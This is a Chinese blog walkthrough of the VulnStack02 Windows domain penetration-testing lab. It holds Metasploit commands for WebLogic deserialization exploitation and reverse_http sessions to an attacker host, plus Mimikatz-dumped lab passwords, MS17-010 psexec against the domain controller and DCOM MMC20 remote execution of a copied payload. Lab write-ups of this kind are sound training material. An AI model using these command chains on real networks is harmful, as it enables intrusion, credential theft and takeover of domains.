@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="VulnStack02环境搭建环境概览 12345WEB机器，公网：192.168.40.131；内网：10.10.10.80PC机器，公网：192.168.40.132；内网：10.10.10.201DC域控：内网：10.10.10.10  有一个地方需要注意，WEB这台机器de1ay用户的密码不是给出的默认密码，需要以administrator身份登录de1ay域并修改de1ay用户的密码。具">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnStack02">
+<meta property="og:url" content="https://givemefivw.github.io/VulnStack02.html">
+<meta property="og:site_name" content="斑马Blog——进击的白帽子">
+<meta property="og:description" content="VulnStack02环境搭建环境概览 12345WEB机器，公网：192.168.40.131；内网：10.10.10.80PC机器，公网：192.168.40.132；内网：10.10.10.201DC域控：内网：10.10.10.10  有一个地方需要注意，WEB这台机器de1ay用户的密码不是给出的默认密码，需要以administrator身份登录de1ay域并修改de1ay用户的密码。具">
+<meta property="og:locale">
+<meta property="og:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled1.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled2.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled3.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled4.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled5.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled6.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled7.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled8.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled9.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled10.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled11.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled12.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled13.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled14.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled15.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled16.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled17.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled18.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled19.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled20.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled21.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled22.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled23.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled24.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled25.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled26.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled27.png">
+<meta property="og:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled28.png">
+<meta property="article:published_time" content="2022-04-13T08:08:20.000Z">
+<meta property="article:modified_time" content="2022-04-13T08:20:48.187Z">
+<meta property="article:author" content="givemefivw">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://givemefivw.github.io/2022/04/13/VulnStack02/Untitled.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>VulnStack02</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Inici</a></li><!--
+     --><!--
+       --><li><a href="/about/">Qui som</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/">Projectes</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Post Anterior" href="/%E5%A5%B6%E8%8C%B6%E5%8F%91%E6%83%85%E5%AE%9E%E5%BD%95.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Post Següent" href="/proxychains%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Adalt" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Compartir Post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://givemefivw.github.io/VulnStack02.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://givemefivw.github.io/VulnStack02.html&text=VulnStack02"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://givemefivw.github.io/VulnStack02.html&title=VulnStack02"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://givemefivw.github.io/VulnStack02.html&is_video=false&description=VulnStack02"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnStack02&body=Check out this article: https://givemefivw.github.io/VulnStack02.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://givemefivw.github.io/VulnStack02.html&title=VulnStack02"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://givemefivw.github.io/VulnStack02.html&title=VulnStack02"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://givemefivw.github.io/VulnStack02.html&title=VulnStack02"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://givemefivw.github.io/VulnStack02.html&title=VulnStack02"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://givemefivw.github.io/VulnStack02.html&name=VulnStack02&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://givemefivw.github.io/VulnStack02.html&t=VulnStack02"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#VulnStack02"><span class="toc-number">1.</span> <span class="toc-text">VulnStack02</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%BC%8F%E6%89%93%E9%9D%B6"><span class="toc-number">1.2.</span> <span class="toc-text">正式打靶</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">0x01 信息收集</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        VulnStack02
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">givemefivw</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-04-13T08:08:20.000Z" itemprop="datePublished">2022-04-13</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/">技术文章</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="VulnStack02"><a href="#VulnStack02" class="headerlink" title="VulnStack02"></a>VulnStack02</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>环境概览</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">WEB</span>机器，公网：<span class="number">192.168</span><span class="number">.40</span><span class="number">.131</span>；内网：<span class="number">10.10</span><span class="number">.10</span><span class="number">.80</span></span><br><span class="line"></span><br><span class="line"><span class="variable constant_">PC</span>机器，公网：<span class="number">192.168</span><span class="number">.40</span><span class="number">.132</span>；内网：<span class="number">10.10</span><span class="number">.10</span><span class="number">.201</span></span><br><span class="line"></span><br><span class="line"><span class="variable constant_">DC</span>域控：内网：<span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span></span><br></pre></td></tr></table></figure>
+
+<p>有一个地方需要注意，WEB这台机器de1ay用户的密码不是给出的默认密码，需要以<code>administrator</code>身份登录<code>de1ay</code>域并修改<code>de1ay</code>用户的密码。具体操作如下：</p>
+<p>首先切换用户，使用<code>Administrator@de1ay/1qaz@WSX</code>登录WEB机器</p>
+<p><img src="/2022/04/13/VulnStack02/Untitled.png" alt="Untitled"></p>
+<p>第一次登录提示修改密码，这里我修改成了<code>hongrisec@2022</code></p>
+<p>接着使用命令行修改<code>de1ay</code>用户的密码：</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net users</span><br><span class="line"></span><br><span class="line">net user de1ay 1qaz@<span class="variable constant_">WSX</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/13/VulnStack02/Untitled1.png" alt="Untitled"></p>
+<p>然后重启机器，此时使用<code>de1ay@de1ay/1qaz@WSX</code>即可登录机器</p>
+<p><img src="/2022/04/13/VulnStack02/Untitled2.png" alt="Untitled"></p>
+<p>还有一个地方就是WEB和PC两台机器的外网IP地址，默认是写死在192.168.111段，需要手动对网络地址进行更改，可以改成本地的网段，也可选择自动获取IP地址：</p>
+<p><img src="/2022/04/13/VulnStack02/Untitled3.png" alt="Untitled"></p>
+<p>例如本地kali是192.168.40段，那么就可以将IP地址改成40段或者自动获得IP地址，然后等待重启网络，此时就可以访问到WEB机器的服务了。</p>
+<h2 id="正式打靶"><a href="#正式打靶" class="headerlink" title="正式打靶"></a>正式打靶</h2><h3 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h3><p>由于靶机的网络适配器均已配置完成，直接登录即可。</p>
+<p>登录WEB机器启动Weblogic服务：</p>
+<p><code>C:\Oracle\Middleware\user_projects\domains\base_domain\bin</code></p>
+<p><img src="/2022/04/13/VulnStack02/Untitled4.png" alt="Untitled"></p>
+<p>前置条件知晓了WEB机器的外网IP，但是可能由于机器设置了禁ping，导致单纯的ping机器无法连通。不过nmap仍然可以扫描到。</p>
+<p>使用nmap扫描机器开放的端口及服务：</p>
+<p><code>nmap -T4 -sS -sV -Pn 192.168.40.131</code></p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Nmap</span> scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.40</span><span class="number">.131</span></span><br><span class="line"><span class="title class_">Host</span> is up (<span class="number">0.</span>00070s latency).</span><br><span class="line"><span class="title class_">Not</span> <span class="attr">shown</span>: <span class="number">988</span> filtered ports</span><br><span class="line"><span class="variable constant_">PORT</span>      <span class="variable constant_">STATE</span> <span class="variable constant_">SERVICE</span>      <span class="variable constant_">VERSION</span></span><br><span class="line"><span class="number">80</span>/tcp    open  http         <span class="title class_">Microsoft</span> <span class="variable constant_">IIS</span> httpd <span class="number">7.5</span></span><br><span class="line"><span class="number">135</span>/tcp   open  msrpc        <span class="title class_">Microsoft</span> <span class="title class_">Windows</span> <span class="variable constant_">RPC</span></span><br><span class="line"><span class="number">139</span>/tcp   open  netbios-ssn  <span class="title class_">Microsoft</span> <span class="title class_">Windows</span> netbios-ssn</span><br><span class="line"><span class="number">445</span>/tcp   open  microsoft-ds <span class="title class_">Microsoft</span> <span class="title class_">Windows</span> <span class="title class_">Server</span> <span class="number">2008</span> <span class="variable constant_">R2</span> - <span class="number">2012</span> microsoft-ds</span><br><span class="line"><span class="number">1433</span>/tcp  open  ms-sql-s     <span class="title class_">Microsoft</span> <span class="variable constant_">SQL</span> <span class="title class_">Server</span> <span class="number">2008</span> <span class="variable constant_">R2</span> <span class="number">10.50</span><span class="number">.4000</span>; <span class="title class_">SP2</span></span><br><span class="line"><span class="number">3389</span>/tcp  open  tcpwrapped</span><br><span class="line"><span class="number">7001</span>/tcp  open  http         <span class="title class_">Oracle</span> <span class="title class_">WebLogic</span> <span class="title class_">Server</span> (<span class="title class_">Servlet</span> <span class="number">2.5</span>; <span class="variable constant_">JSP</span> <span class="number">2.1</span>)</span><br><span class="line"><span class="number">49152</span>/tcp open  msrpc        <span class="title class_">Microsoft</span> <span class="title class_">Windows</span> <span class="variable constant_">RPC</span></span><br><span class="line"><span class="number">49153</span>/tcp open  msrpc        <span class="title class_">Microsoft</span> <span class="title class_">Windows</span> <span class="variable constant_">RPC</span></span><br><span class="line"><span class="number">49154</span>/tcp open  msrpc        <span class="title class_">Microsoft</span> <span class="title class_">Windows</span> <span class="variable constant_">RPC</span></span><br><span class="line"><span class="number">49155</span>/tcp open  msrpc        <span class="title class_">Microsoft</span> <span class="title class_">Windows</span> <span class="variable constant_">RPC</span></span><br><span class="line"><span class="number">49160</span>/tcp open  msrpc        <span class="title class_">Microsoft</span> <span class="title class_">Windows</span> <span class="variable constant_">RPC</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到重点端口为80，445，1433，3389，7001</p>
+<p>访问80端口得到一片空白，转向7001Weblogic服务。</p>
+<p>通过目录扫描可以扫描到Weblogic的登录后台：</p>
+<p><img src="/2022/04/13/VulnStack02/Untitled5.png" alt="Untitled"></p>
+<p>访问后台得到服务版本10.3.6.0：</p>
+<p><img src="/2022/04/13/VulnStack02/Untitled6.png" alt="Untitled"></p>
+<p>使用专项漏洞检测工具扫描,存在CVE_2020_2551：</p>
+<p><img src="/2022/04/13/VulnStack02/Untitled7.png" alt="Untitled"></p>
+<p>尝试执行命令，成功：</p>
+<p><img src="/2022/04/13/VulnStack02/Untitled8.png" alt="Untitled"></p>
+<p>执行tasklist &#x2F;svc将结果扔进杀软对比查询<a target="_blank" rel="noopener" href="https://sr.xljtj.com/">Windows杀软在线对比辅助-心灵鸡汤君 (xljtj.com)</a>，发现机器存在360安全软件：</p>
+<p><img src="/2022/04/13/VulnStack02/Untitled9.png" alt="Untitled"></p>
+<p>到这里暂时陷入僵局，工具支持上传webshell，但是上传成功后，无法获取shell的具体路径。</p>
+<p><img src="/2022/04/13/VulnStack02/Untitled10.png" alt="Untitled"></p>
+<p><img src="/2022/04/13/VulnStack02/Untitled11.png" alt="Untitled"></p>
+<p>远程免杀吧，文件过了，但是试了好几种请求方式360一直杀，无法上线。</p>
+<p>到这里查了好多师傅的文章，好多都是用熟知的方式直接就上线，后来看到一个师傅的文章：</p>
+<p><img src="/2022/04/13/VulnStack02/Untitled12.png" alt="Untitled"></p>
+<p>然后试着把360关掉，就直接拿到了meterpreter。。。</p>
+<p>原来都省略了免杀2333</p>
+<p>咋办捏，免杀能力确实不够，只能暂时关掉360了。。。</p>
+<p>这里尝试了CVE-2019-2725直接上传冰蝎马，但是同样不知道什么原因页面404，但是机器目录下已经存在了shell.jsp文件。</p>
+<p>然后使用msf拿到权限：</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">search weblogic</span><br><span class="line"></span><br><span class="line">use exploit/multi/misc/weblogic_deserialize_asyncresponseservice</span><br><span class="line"></span><br><span class="line">set target <span class="number">1</span></span><br><span class="line"></span><br><span class="line">set rhosts <span class="number">192.168</span><span class="number">.40</span><span class="number">.131</span></span><br><span class="line"></span><br><span class="line">set lhosts <span class="number">192.168</span><span class="number">.40</span><span class="number">.128</span></span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/13/VulnStack02/Untitled13.png" alt="Untitled"></p>
+<p>得到机器的SYSTEM权限</p>
+<p>然后派生到CS：</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line"></span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line"></span><br><span class="line">set <span class="variable constant_">LHOST</span> <span class="number">192.168</span><span class="number">.40</span><span class="number">.130</span>    <span class="comment">//cs主机地址</span></span><br><span class="line"></span><br><span class="line">set <span class="variable constant_">LPORT</span>  <span class="number">80</span>   <span class="comment">//随意设置监听端口，需要和cs保持一致</span></span><br><span class="line"></span><br><span class="line">set session <span class="number">1</span>    <span class="comment">//设置需要派送的meterpreter</span></span><br><span class="line"></span><br><span class="line">set <span class="title class_">DisablePayloadHandler</span> <span class="literal">true</span>    <span class="comment">//禁止产生一个新的handler</span></span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/13/VulnStack02/Untitled14.png" alt="Untitled"></p>
+<p>CS接到上线会话，利用梼杌插件提权：</p>
+<p><img src="/2022/04/13/VulnStack02/Untitled15.png" alt="Untitled"></p>
+<p>接着运行DumpHash，Mimikatz，得到明文密码信息：</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Administrator</span>  hongrisec@<span class="number">2022</span></span><br><span class="line"></span><br><span class="line">mssql          1qaz@<span class="variable constant_">WSX</span></span><br><span class="line"></span><br><span class="line">de1ay          1qaz@<span class="variable constant_">WSX</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/13/VulnStack02/Untitled16.png" alt="Untitled"></p>
+<p>然后收集基础信息，IP、路由、域内存活主机，得到域内其他存活主机:10.10.10.10(DC域控)、10.10.10.201：</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br><span class="line"></span><br><span class="line">run get_local_subnets</span><br><span class="line"></span><br><span class="line">run autoroute -s <span class="number">10.10</span><span class="number">.10</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">run post/windows/gather/arp_scanner <span class="variable constant_">RHOSTS</span>=<span class="number">10.10</span><span class="number">.10</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/13/VulnStack02/Untitled17.png" alt="Untitled"></p>
+<p><img src="/2022/04/13/VulnStack02/Untitled18.png" alt="Untitled"></p>
+<p>接着对存活主机进行端口扫描，得到两台存活主机均开启445和3389端口：</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line"></span><br><span class="line">set ports <span class="number">80</span>,<span class="number">8080</span>,<span class="number">445</span>,<span class="number">3389</span>,<span class="number">3306</span></span><br><span class="line"></span><br><span class="line">set rhosts <span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span>/<span class="number">201</span></span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/13/VulnStack02/Untitled19.png" alt="Untitled"></p>
+<p>使用ms17010进行探测，发现两台主机均存在漏洞：</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line"></span><br><span class="line">set rhosts <span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span>/<span class="number">201</span></span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/13/VulnStack02/Untitled20.png" alt="Untitled"></p>
+<p>利用<code>admin/smb/ms17_010_command</code>模块进行验证,发现10主机可以回显，而201主机无法回显</p>
+<p><img src="/2022/04/13/VulnStack02/Untitled21.png" alt="Untitled"></p>
+<p>因为这里和vulnstack01一样，msf6也无法正常弹回meterpreter，将之前的CS派生到msf低版本下：</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">set payload windows/meterpreter/reverse_http（跟cs上选用的payload一样）</span><br><span class="line"></span><br><span class="line">set lhost <span class="number">192.168</span><span class="number">.40</span><span class="number">.130</span></span><br><span class="line"></span><br><span class="line">set lport <span class="number">6666</span></span><br><span class="line"></span><br><span class="line">exploit </span><br></pre></td></tr></table></figure>
+
+<p>开启监听后，CS新建foreign http，设置监听地址和端口同msf</p>
+<p>然后选中主机spawn到外部监听：</p>
+<p><img src="/2022/04/13/VulnStack02/Untitled22.png" alt="Untitled"></p>
+<p>然后msf即可接收会话：</p>
+<p><img src="/2022/04/13/VulnStack02/Untitled23.png" alt="Untitled"></p>
+<p>然后加入路由，使用exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec模块，获取到域控权限：</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line"></span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line"></span><br><span class="line">set rhost <span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span></span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/13/VulnStack02/Untitled24.png" alt="Untitled"></p>
+<p>到这里拿下了两台机器，但是PC这台机器显示存在ms17010，但是使用两个版本的msf都无法获取权限，提示<code>[-] 10.10.10.201:445 - Unable to find accessible named pipe!</code></p>
+<p>只能利用其他的方法。</p>
+<p>查了师傅们的笔记，前面获取到密码，可以在WEB机器上使用ipc连接，上传木马拿权限。</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chcp <span class="number">65001</span>       <span class="comment">//解决meterpreter中文乱码</span></span><br><span class="line"></span><br><span class="line">net use \\<span class="number">10.10</span><span class="number">.10</span><span class="number">.201</span>\ipc$ <span class="string">&quot;hongrisec@2022&quot;</span> /<span class="attr">user</span>:administrator</span><br><span class="line"></span><br><span class="line">upload /root/artifact.<span class="property">exe</span> <span class="attr">c</span>:<span class="comment">//</span></span><br><span class="line"></span><br><span class="line">copy <span class="attr">c</span>:\\artifact.<span class="property">exe</span> \\<span class="number">10.10</span><span class="number">.10</span><span class="number">.201</span>\c$ /y</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/13/VulnStack02/Untitled25.png" alt="Untitled"></p>
+<p><img src="/2022/04/13/VulnStack02/Untitled26.png" alt="Untitled"></p>
+<p>然后由WEB上的powershell通过DCOM控制PC执行木马程序：</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">load powershell </span><br><span class="line"></span><br><span class="line">powershell_shell</span><br><span class="line"></span><br><span class="line">$com = [activator]::<span class="title class_">CreateInstance</span>([type]::<span class="title class_">GetTypeFromProgID</span>(<span class="string">&quot;MMC20.Application&quot;</span>,<span class="string">&quot;10.10.10.201&quot;</span>))</span><br><span class="line">$com.<span class="property">Document</span>.<span class="property">ActiveView</span>.<span class="title class_">ExecuteShellCommand</span>(<span class="string">&#x27;cmd.exe&#x27;</span>,$null,<span class="string">&quot;/c C:\artifact.exe&quot;</span>,<span class="string">&quot;Minimized&quot;</span>)</span><br><span class="line"></span><br><span class="line">[activator]::<span class="title class_">CreateInstance</span>([type]::<span class="title class_">GetTypeFromProgID</span>(<span class="string">&quot;MMC20.application&quot;</span> ,<span class="string">&quot;10.10.10.201&quot;</span>)).<span class="property">Document</span>.<span class="property">ActiveView</span>.<span class="title class_">Executeshellcommand</span>(<span class="string">&#x27;cmd.exe&#x27;</span>,$null,<span class="string">&quot;/c artifact.exe&quot;</span>,<span class="string">&quot;Restored&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>但是不知道为什么还是出现错误：</p>
+<p><img src="/2022/04/13/VulnStack02/Untitled27.png" alt="Untitled"></p>
+<p>只能意淫payload免杀钓鱼上线，，，，</p>
